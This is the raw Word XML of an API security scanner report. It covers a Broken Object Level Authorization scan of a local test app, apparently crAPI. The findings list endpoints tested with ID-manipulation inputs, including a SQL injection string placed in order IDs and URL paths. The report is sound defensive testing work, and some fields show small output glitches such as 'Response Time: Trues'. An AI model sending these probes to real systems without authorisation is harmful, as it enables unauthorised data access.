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Security Scanner. This program is created by Perry Mertens April 2025 (c)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Generated on: 2025-06-01 13:53:50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API1:2023 – Broken Object Level Authorization</w:t>
        <w:br/>
        <w:t>API2:2023 – Broken Authentication</w:t>
        <w:br/>
        <w:t>API3:2023 – Broken Object Property Level Authorization</w:t>
        <w:br/>
        <w:t>API4:2023 – Unrestricted Resource Consumption</w:t>
        <w:br/>
        <w:t>API5:2023 – Broken Function Level Authorization</w:t>
        <w:br/>
        <w:t>API6:2023 – Unrestricted Access to Sensitive Business Flows</w:t>
        <w:br/>
        <w:t>API7:2023 – Server Side Request Forgery</w:t>
        <w:br/>
        <w:t>API8:2023 – Security Misconfiguration</w:t>
        <w:br/>
        <w:t>API9:2023 – Improper Inventory Management</w:t>
        <w:br/>
        <w:t>API10:2023 – Unsafe Consumption of APIs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>API1:2023 – Broken Object Level Authorization</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>APIs expose object IDs in their endpoints. Attackers can manipulate IDs to retrieve or modify unauthorized data.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Bola</w:t>
        <w:br/>
        <w:t>Scan Time: 2025-06-01 11:49:08</w:t>
        <w:br/>
        <w:t>Base URL: http://127.0.0.1:8888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37 | Multiple sensitive items exposed |</w:t>
        <w:br/>
        <w:t>| 🛑 High       | 4 | Single sensitive item exposed |</w:t>
        <w:br/>
        <w:t>| ⚠️ Medium     | 11 | 200 OK on unprotected endpoint |</w:t>
        <w:br/>
        <w:t>| ℹ️ Low        | 147 | Errors or minor issues |</w:t>
        <w:br/>
        <w:br/>
        <w:t>### Detailed Findings</w:t>
        <w:br/>
        <w:br/>
        <w:t>🚨 **Critical Risk Findings**</w:t>
        <w:br/>
        <w:br/>
        <w:t>1.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valid</w:t>
        <w:br/>
        <w:br/>
        <w:t>2.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other_user</w:t>
        <w:br/>
        <w:br/>
        <w:t>3.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string</w:t>
        <w:br/>
        <w:br/>
        <w:t>4.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injection</w:t>
        <w:br/>
        <w:br/>
        <w:t>5.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non_existent</w:t>
        <w:br/>
        <w:br/>
        <w:t>6.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random_uuid</w:t>
        <w:br/>
        <w:br/>
        <w:t>7.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admin_user</w:t>
        <w:br/>
        <w:br/>
        <w:t>8.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high_value</w:t>
        <w:br/>
        <w:br/>
        <w:t>9.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string_long</w:t>
        <w:br/>
        <w:br/>
        <w:t>10. **POST http://127.0.0.1:8888/identity/api/v2/user/reset-password**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/reset-password`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 500</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642171</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: string_special_chars</w:t>
        <w:br/>
        <w:br/>
        <w:t>11.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valid</w:t>
        <w:br/>
        <w:br/>
        <w:t>12.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other_user</w:t>
        <w:br/>
        <w:br/>
        <w:t>13.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string</w:t>
        <w:br/>
        <w:br/>
        <w:t>14.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injection</w:t>
        <w:br/>
        <w:br/>
        <w:t>15.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non_existent</w:t>
        <w:br/>
        <w:br/>
        <w:t>16.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random_uuid</w:t>
        <w:br/>
        <w:br/>
        <w:t>17.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admin_user</w:t>
        <w:br/>
        <w:br/>
        <w:t>18.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high_value</w:t>
        <w:br/>
        <w:br/>
        <w:t>19.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string_long</w:t>
        <w:br/>
        <w:br/>
        <w:t>20. **POST http://127.0.0.1:8888/identity/api/v2/user/verify-email-token**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/verify-email-token`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 500</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642171</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: string_special_chars</w:t>
        <w:br/>
        <w:br/>
        <w:t>21. **PUT http://127.0.0.1:8888/workshop/api/shop/orders/99999**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/workshop/api/shop/orders/99999`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 500</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: non_existent</w:t>
        <w:br/>
        <w:br/>
        <w:t>22. **PUT http://127.0.0.1:8888/workshop/api/shop/orders/1000000**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/workshop/api/shop/orders/1000000`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 500</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: high_value</w:t>
        <w:br/>
        <w:br/>
        <w:t>23. **PUT http://127.0.0.1:8888/workshop/api/shop/orders/0**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/workshop/api/shop/orders/0`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 500</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: integer_zero</w:t>
        <w:br/>
        <w:br/>
        <w:t>24. **PUT http://127.0.0.1:8888/workshop/api/shop/orders/2147483647**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/workshop/api/shop/orders/2147483647`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 500</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: integer_large</w:t>
        <w:br/>
        <w:br/>
        <w:t>25. **GET http://127.0.0.1:8888/workshop/api/shop/orders/99999**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/workshop/api/shop/orders/99999`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 500</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: non_existent</w:t>
        <w:br/>
        <w:br/>
        <w:t>26. **GET http://127.0.0.1:8888/workshop/api/shop/orders/1000000**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/workshop/api/shop/orders/1000000`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 500</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: high_value</w:t>
        <w:br/>
        <w:br/>
        <w:t>27. **GET http://127.0.0.1:8888/workshop/api/shop/orders/0**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/workshop/api/shop/orders/0`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 500</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: integer_zero</w:t>
        <w:br/>
        <w:br/>
        <w:t>28. **GET http://127.0.0.1:8888/workshop/api/shop/orders/2147483647**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/workshop/api/shop/orders/2147483647`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 500</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: integer_large</w:t>
        <w:br/>
        <w:br/>
        <w:t>29.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string</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Body:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {'order_id': 'testuser'}</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:br/>
        <w:t>30.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injection</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Body:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {'order_id': '" OR "1"="1--",'}</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:br/>
        <w:t>31.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non_existent</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Body:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {'order_id': '99999'}</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:br/>
        <w:t>32.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random_uuid</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Body:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {'order_id': '550e8400-e29b-41d4-a716-446655440000'}</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:br/>
        <w:t>33.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admin_user</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Body:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {'order_id': 'admin'}</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:br/>
        <w:t>34.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high_value</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Body:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {'order_id': '1000000'}</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:br/>
        <w:t>35.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integer_negative</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Body:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {'order_id': '-1'}</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:br/>
        <w:t>36.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integer_zero</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Body:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {'order_id': '0'}</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:br/>
        <w:t>37. **POST http://127.0.0.1:8888/workshop/api/shop/orders/return_order**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/workshop/api/shop/orders/return_order`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 500</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: integer_large</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Body:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {'order_id': '2147483647'}</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:br/>
        <w:t>🛑 **High Risk Findings**</w:t>
        <w:br/>
        <w:br/>
        <w:t>1. **GET http://127.0.0.1:8888/workshop/api/shop/orders/1**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/workshop/api/shop/orders/1`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 200</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Time: Trues</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: valid</w:t>
        <w:br/>
        <w:br/>
        <w:t>2. **GET http://127.0.0.1:8888/workshop/api/shop/orders/2**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/workshop/api/shop/orders/2`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 200</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Time: Trues</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: other_user</w:t>
        <w:br/>
        <w:br/>
        <w:t>3. **GET http://127.0.0.1:8888/workshop/api/mechanic/mechanic_report**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/workshop/api/mechanic/mechanic_report`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 200</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Time: Trues</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: valid</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Body:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {'report_id': '1'}</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:br/>
        <w:t>4. **GET http://127.0.0.1:8888/workshop/api/mechanic/mechanic_report**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/workshop/api/mechanic/mechanic_report`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 200</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Time: Trues</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: other_user</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Body:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {'report_id': '2'}</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:br/>
        <w:t>⚠️ **Medium Risk Findings**</w:t>
        <w:br/>
        <w:br/>
        <w:t>1.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valid</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Body:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {'video_id': '1'}</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:br/>
        <w:t>2.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other_user</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Body:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {'video_id': '2'}</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:br/>
        <w:t>3.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non_existent</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Body:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {'video_id': '99999'}</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:br/>
        <w:t>4.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high_value</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Body:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {'video_id': '1000000'}</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:br/>
        <w:t>5.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integer_negative</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Body:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {'video_id': '-1'}</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:br/>
        <w:t>6.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integer_zero</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Body:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {'video_id': '0'}</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:br/>
        <w:t>7.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403</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642171</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: integer_large</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Body:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {'video_id': '2147483647'}</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:br/>
        <w:t>8. **PUT http://127.0.0.1:8888/workshop/api/shop/orders/1**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/workshop/api/shop/orders/1`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 403</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: valid</w:t>
        <w:br/>
        <w:br/>
        <w:t>9. **PUT http://127.0.0.1:8888/workshop/api/shop/orders/2**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/workshop/api/shop/orders/2`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 403</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: other_user</w:t>
        <w:br/>
        <w:br/>
        <w:t>10. **POST http://127.0.0.1:8888/workshop/api/shop/orders/return_order**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/workshop/api/shop/orders/return_order`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 403</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: valid</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Body:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {'order_id': '1'}</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:br/>
        <w:t>11. **POST http://127.0.0.1:8888/workshop/api/shop/orders/return_order**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/workshop/api/shop/orders/return_order`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 403</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: other_user</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Body:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {'order_id': '2'}</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:br/>
        <w:t>ℹ️ **Low Risk Findings**</w:t>
        <w:br/>
        <w:br/>
        <w:t>1.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valid</w:t>
        <w:br/>
        <w:br/>
        <w:t>2.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other_user</w:t>
        <w:br/>
        <w:br/>
        <w:t>3.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br/>
        <w:t>4.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br/>
        <w:t>5.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non_existent</w:t>
        <w:br/>
        <w:br/>
        <w:t>6.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br/>
        <w:t>7.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br/>
        <w:t>8.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high_value</w:t>
        <w:br/>
        <w:br/>
        <w:t>9.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string_long</w:t>
        <w:br/>
        <w:br/>
        <w:t>10. **POST http://127.0.0.1:8888/identity/api/auth/signup**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/auth/signup`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642171</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: string_special_chars</w:t>
        <w:br/>
        <w:br/>
        <w:t>11.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valid</w:t>
        <w:br/>
        <w:br/>
        <w:t>12.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other_user</w:t>
        <w:br/>
        <w:br/>
        <w:t>13.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br/>
        <w:t>14.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br/>
        <w:t>15.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non_existent</w:t>
        <w:br/>
        <w:br/>
        <w:t>16.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br/>
        <w:t>17.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br/>
        <w:t>18.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high_value</w:t>
        <w:br/>
        <w:br/>
        <w:t>19.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string_long</w:t>
        <w:br/>
        <w:br/>
        <w:t>20. **POST http://127.0.0.1:8888/identity/api/auth/login**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/auth/login`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642171</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: string_special_chars</w:t>
        <w:br/>
        <w:br/>
        <w:t>21.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valid</w:t>
        <w:br/>
        <w:br/>
        <w:t>22.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other_user</w:t>
        <w:br/>
        <w:br/>
        <w:t>23.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br/>
        <w:t>24.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br/>
        <w:t>25.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non_existent</w:t>
        <w:br/>
        <w:br/>
        <w:t>26.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br/>
        <w:t>27.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br/>
        <w:t>28.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high_value</w:t>
        <w:br/>
        <w:br/>
        <w:t>29.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string_long</w:t>
        <w:br/>
        <w:br/>
        <w:t>30. **POST http://127.0.0.1:8888/identity/api/auth/forget-password**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/auth/forget-password`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642171</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: string_special_chars</w:t>
        <w:br/>
        <w:br/>
        <w:t>31. **POST http://127.0.0.1:8888/identity/api/v2/user/change-email**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/change-email`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642171</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: valid</w:t>
        <w:br/>
        <w:br/>
        <w:t>32. **POST http://127.0.0.1:8888/identity/api/v2/user/change-email**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/change-email`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642171</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: other_user</w:t>
        <w:br/>
        <w:br/>
        <w:t>33.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string</w:t>
        <w:br/>
        <w:br/>
        <w:t>34.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injection</w:t>
        <w:br/>
        <w:br/>
        <w:t>35.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non_existent</w:t>
        <w:br/>
        <w:br/>
        <w:t>36.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random_uuid</w:t>
        <w:br/>
        <w:br/>
        <w:t>37.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admin_user</w:t>
        <w:br/>
        <w:br/>
        <w:t>38.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high_value</w:t>
        <w:br/>
        <w:br/>
        <w:t>39. **POST http://127.0.0.1:8888/identity/api/v2/user/change-email**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/change-email`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642171</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: string_long</w:t>
        <w:br/>
        <w:br/>
        <w:t>40. **POST http://127.0.0.1:8888/identity/api/v2/user/change-email**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/change-email`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 404</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642171</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: string_special_chars</w:t>
        <w:br/>
        <w:br/>
        <w:t>41. **GET http://127.0.0.1:8888/identity/api/v2/user/videos/1**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/videos/1`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 404</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642171</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: valid</w:t>
        <w:br/>
        <w:br/>
        <w:t>42. **GET http://127.0.0.1:8888/identity/api/v2/user/videos/2**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/videos/2`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 404</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642171</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: other_user</w:t>
        <w:br/>
        <w:br/>
        <w:t>43. **GET http://127.0.0.1:8888/identity/api/v2/user/videos/testuser**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/videos/testuser`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br/>
        <w:t>44. **GET http://127.0.0.1:8888/identity/api/v2/user/videos/" OR "1"="1--",**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/videos/" OR "1"="1--",`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br/>
        <w:t>45. **GET http://127.0.0.1:8888/identity/api/v2/user/videos/99999**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/videos/99999`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 404</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642171</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: non_existent</w:t>
        <w:br/>
        <w:br/>
        <w:t>46. **GET http://127.0.0.1:8888/identity/api/v2/user/videos/550e8400-e29b-41d4-a716-446655440000**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/videos/550e8400-e29b-41d4-a716-446655440000`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br/>
        <w:t>47. **GET http://127.0.0.1:8888/identity/api/v2/user/videos/admin**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/videos/admin`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br/>
        <w:t>48. **GET http://127.0.0.1:8888/identity/api/v2/user/videos/1000000**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/videos/1000000`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 404</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642171</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: high_value</w:t>
        <w:br/>
        <w:br/>
        <w:t>49. **GET http://127.0.0.1:8888/identity/api/v2/user/videos/-1**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/videos/-1`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 404</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642171</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: integer_negative</w:t>
        <w:br/>
        <w:br/>
        <w:t>50. **GET http://127.0.0.1:8888/identity/api/v2/user/videos/0**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/videos/0`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 404</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642171</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: integer_zero</w:t>
        <w:br/>
        <w:br/>
        <w:t>51. **GET http://127.0.0.1:8888/identity/api/v2/user/videos/2147483647**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/videos/2147483647`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 404</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642171</w:t>
